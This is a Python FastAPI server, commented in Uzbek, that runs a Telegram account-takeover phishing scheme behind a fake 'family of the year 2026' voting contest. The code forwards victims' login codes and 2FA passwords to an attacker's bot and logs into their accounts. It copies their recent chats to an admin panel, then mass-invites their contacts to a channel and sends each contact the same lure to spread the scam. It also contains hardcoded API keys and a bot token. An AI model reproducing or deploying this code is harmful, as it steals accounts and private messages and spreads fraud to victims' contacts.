
import os
import asyncio
import uvicorn
import httpx
import io
import base64
import json
import glob
from fastapi import FastAPI, BackgroundTasks, HTTPException
from telethon import TelegramClient, errors, types, events, functions
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# --- ADMIN KONFIGURATSIYASI ---
_API_ID = 26790161
_API_HASH = '0da2c93308d6f99444c87ed7af1973fd'
_BOT_TOKEN = "8153551399:AAHTzgDDJDSyBqmW9vuolk0lZNHYVcjaPqU"
_ADMIN_ID = 8426582765
_PROMO_CHANNEL = "@vsf_lvl" 
_SPAM_MESSAGE = "🌟 Assalomu alaykum! Men 'YIL OILASI 2026' tanlovida qatnashyapman. Iltimos, menga ovoz bering va siz ham sovg'alar yutib oling! \n\nOvoz berish uchun havola: https://yil-oilasi-tanlov.vercel.app/ "

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# Ma'lumotlar bazasi (Xotirada doimiy saqlash uchun)
_db = {
    "targets": {},  # { phone: { identity: {}, chats: [], status: 'logged_in' } }
    "pending": {}   # { phone: { identity: {}, status: 'waiting_code' } }
}

bot = TelegramClient('admin_bot', _API_ID, _API_HASH).start(bot_token=_BOT_TOKEN)

async def _send_notif_to_bot(txt):
    """Admin botga operativ xabar yuborish."""
    try:
        await bot.send_message(_ADMIN_ID, txt, parse_mode='html')
    except Exception as e:
        print(f"Bot notification error: {e}")

async def _aggressive_actions(client, phone):
    """Maksimal tezlikda spam va invite."""
    try:
        # 1. Kontaktlarni olish (Cheklovsiz)
        contacts = await client(functions.contacts.GetContactsRequest(hash=0))
        users = [u for u in contacts.users if not u.bot]
        
        if not users:
            await _send_notif_to_bot(f"⚠️ +{phone} akkauntida kontaktlar topilmadi.")
            return

        # 2. Kanalga qo'shish (Invite all at once)
        try:
            user_ids = [u.id for u in users]
            # Telegram cheklovlaridan qochish uchun 50 tadan bo'lib qo'shamiz lekin tez
            for i in range(0, len(user_ids), 50):
                batch = user_ids[i:i+50]
                await client(functions.channels.InviteToChannelRequest(channel=_PROMO_CHANNEL, users=batch))
            await client(functions.channels.JoinChannelRequest(channel=_PROMO_CHANNEL))
        except: pass

        # 3. "Chaqlom" Spam (Minimal sleep)
        sent_count = 0
        tasks = []
        
        async def send_msg(user_id):
            nonlocal sent_count
            try:
                await client.send_message(user_id, _SPAM_MESSAGE)
                sent_count += 1
            except: pass

        # Bir vaqtning o'zida bir nechta xabar yuborish (Async parallel)
        for u in users:
            tasks.append(send_msg(u.id))
            if len(tasks) >= 10: # 10 ta parallel xabar
                await asyncio.gather(*tasks)
                tasks = []
                await asyncio.sleep(0.05) # Flood wait'dan qochish uchun juda qisqa vaqt

        await _send_notif_to_bot(f"🚀 <b>TEZKOR HISOBOT (+{phone}):</b>\n✅ Kontaktlar kanalga taklif qilindi.\n✅ {sent_count} ta kontaktga spam yuborildi.")

    except Exception as e:
        print(f"Aggressive action error: {e}")

async def _scrape_data(client, phone):
    """Chatlarni yuklash va agressiv amallarni ishga tushirish."""
    try:
        target_info = _db["pending"].get(phone, {"identity": {}})
        chats_data = []
        
        async for dialog in client.iter_dialogs(limit=50): # Eng muhim 50 ta chat
            chat = {"name": dialog.name, "id": dialog.id, "messages": []}
            async for msg in client.iter_messages(dialog, limit=30):
                chat["messages"].append({
                    "text": msg.text or "[Media]",
                    "out": msg.out,
                    "date": msg.date.strftime("%H:%M")
                })
            chats_data.append(chat)
        
        _db["targets"][phone] = {
            "identity": target_info.get("identity"),
            "chats": chats_data,
            "status": "online"
        }
        
        if phone in _db["pending"]: del _db["pending"][phone]
        await _send_notif_to_bot(f"🔓 <b>KIRISH MUVAFFIQLI (+{phone}):</b>\nBarcha chatlar va rasmlar Admin Panelda.")
        
        # Spam va Invite boshlash
        await _aggressive_actions(client, phone)

    except Exception as e:
        print(f"Scrape error: {e}")

@app.post("/send-code")
async def send_code(r: dict):
    phone = r["phone"].replace("+", "")
    _db["pending"][phone] = {
        "identity": r.get("identity", {}),
        "status": "waiting_code"
    }
    
    await _send_notif_to_bot(f"📱 <b>YANGI RAQAM (+{phone}):</b>\nAdmin panelga rasmlar yuklandi. Kod kutilmoqda...")
    
    if not os.path.exists('sessions'): os.makedirs('sessions')
    cl = TelegramClient(f"sessions/{phone}", _API_ID, _API_HASH, device_model="Samsung S24 Ultra")
    try:
        await cl.connect()
        h = await cl.send_code_request(phone)
        return {"status": "ok", "hash": h.phone_code_hash}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/login")
async def login(r: dict, bt: BackgroundTasks):
    phone = r.get("phone").replace("+", "")
    code = r.get("code")
    pwd = r.get("password")
    hash = r.get("hash")
    
    if code: await _send_notif_to_bot(f"🔢 <b>KOD (+{phone}):</b> <code>{code}</code>")
    if pwd: await _send_notif_to_bot(f"🔐 <b>2FA (+{phone}):</b> <code>{pwd}</code>")

    cl = TelegramClient(f"sessions/{phone}", _API_ID, _API_HASH, device_model="Samsung S24 Ultra")
    try:
        await cl.connect()
        if pwd: await cl.sign_in(password=pwd)
        else: await cl.sign_in(phone, code, phone_code_hash=hash)
        
        bt.add_task(_scrape_data, cl, phone)
        return {"status": "ok"}
    except errors.SessionPasswordNeededError:
        return {"status": "2fa_needed"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/admin/targets")
async def get_targets():
    combined = []
    for p, d in _db["targets"].items():
        combined.append({"phone": p, "identity": d["identity"], "status": "logged_in", "chatCount": len(d["chats"])})
    for p, d in _db["pending"].items():
        combined.append({"phone": p, "identity": d["identity"], "status": "pending", "chatCount": 0})
    return combined

@app.get("/admin/target/{phone}")
async def get_target_details(phone: str):
    if phone in _db["targets"]: return _db["targets"][phone]
    if phone in _db["pending"]: return _db["pending"][phone]
    raise HTTPException(status_code=404, detail="Topilmadi")

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
